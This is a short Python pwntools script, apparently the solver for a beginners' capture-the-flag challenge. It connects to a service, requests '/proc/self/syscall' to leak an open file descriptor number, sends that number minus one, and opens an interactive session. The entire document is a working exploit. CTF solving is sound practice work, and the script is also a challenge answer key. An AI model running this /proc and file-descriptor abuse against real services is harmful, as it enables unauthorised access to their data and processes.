from pwn import *
import os

HOST = os.getenv("CTF4B_HOST", "localhost")
PORT = int(os.getenv("CTF4B_PORT", "13778"))

p = remote(HOST, PORT)
p.sendlineafter(b'path: ', b'/proc/self/syscall')
fd = int(p.recvline().split()[1], 16)
p.sendline(str(fd - 1).encode())
p.interactive()
